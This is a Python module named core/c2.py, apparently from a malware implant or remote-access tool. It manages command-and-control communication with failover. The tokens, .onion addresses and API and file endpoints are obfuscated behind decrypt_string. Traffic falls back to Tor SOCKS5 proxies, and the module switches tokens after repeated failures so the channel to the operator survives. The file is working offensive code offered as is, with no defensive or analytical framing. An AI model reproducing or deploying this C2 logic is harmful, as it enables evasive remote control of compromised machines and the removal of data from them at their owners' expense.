"""
core/c2.py - Multi-token C2 with failover
"""

import time
import random
import threading
from core.obfuscation import decrypt_string

class C2Manager:
    """Manages multiple C2 tokens with automatic failover"""

    def __init__(self):

        self.tokens = [
            decrypt_string("VgZBXH9pYVJuRVB5M38tOxcCMSEFYhJUNTEJdh1rUjkgfU0NFwEhEzVAPFsAaA=="),
            decrypt_string("VgdKW39paFVjQFB5M38+MRcEFw87P2oAICEGczQLAEoDAS0CNzI1V3cQJQgKVg=="),
            decrypt_string("VgVPWn9lblNrTlB5M38SVycDHF56Z2AMEi0jS0AAJA0Fdh4BGhY8N2otHnQYDQ=="),
        ]

        self.bridges = []

        self.onion_urls = [
            decrypt_string("BkYMGz1rdk0hBA9KB09dBwdfHU8/Kjw7FzsYCFxdSxMU"), # Example .onion
        ]

        self.proxies = [
            "socks5h://127.0.0.1:9050", # Standard TOR
            "socks5h://127.0.0.1:9150", # TOR Browser
        ]

        self.current_token_index = 0
        self.current_bridge_index = 0
        self.current_proxy_index = -1 # -1 means no proxy
        self.failed_attempts = 0
        self.max_failures = 3
        self.lock = threading.Lock()

    def get_current_token(self):
        """Get current active token"""
        with self.lock:
            tok = self.tokens[self.current_token_index]
            return tok.strip() if isinstance(tok, str) else ""

    def get_proxy(self):
        """Get current proxy if failover is active"""
        with self.lock:
            if self.current_proxy_index == -1: return None
            return self.proxies[self.current_proxy_index % len(self.proxies)]

    def report_failure(self):
        """Report a failure and potentially switch tokens/proxies"""
        with self.lock:
            self.failed_attempts += 1
            if self.failed_attempts >= self.max_failures:
                # If we've failed enough, try enabling proxy
                if self.current_proxy_index == -1:
                    self.current_proxy_index = 0
                    log_info("Enabling SOCKS5 proxy failover", "C2")
                else:
                    self.current_proxy_index += 1
                    self._switch_to_next()
                return True
        return False

    def report_success(self):
        """Reset failure counter and potentially disable proxy"""
        with self.lock:
            self.failed_attempts = 0
            # If we succeed with proxy, we keep it for now. 
            # If we succeed without it, definitely keep it off.

    def _switch_to_next(self):
        """Switch to next available token"""
        self.current_token_index = (self.current_token_index + 1) % len(self.tokens)
        log_info(f"Switched to token index {self.current_token_index}", "C2")
        self.failed_attempts = 0

    def get_api_url(self):
        """Get full API URL with current bridge or onion fallback"""
        with self.lock:
            if self.current_proxy_index != -1 and self.onion_urls:
                return self.onion_urls[0] + decrypt_string("QVAXHzVhJE0hRhc=")

        try:
            from core.bridge_manager import bridge_manager
            route = bridge_manager.get_best_route()
            if route and route.get('api_url'):
                return route['api_url']
        except:
            pass

        bridge = self.get_current_bridge()
        if bridge:
            return bridge + decrypt_string("QVAXHzVhJE0hRhc=")
        return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU=")

    def get_file_url(self):
        """Get file URL with current bridge or onion fallback"""
        with self.lock:
            if self.current_proxy_index != -1 and self.onion_urls:
                return self.onion_urls[0] + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")

        try:
            from core.bridge_manager import bridge_manager
            route = bridge_manager.get_best_route()
            if route and route.get('file_url'):
                return route['file_url']
        except:
            pass

        bridge = self.get_current_bridge()
        if bridge:
            return bridge + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")
        return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw==")

from core.error_logger import log_info, log_error
c2_manager = C2Manager()
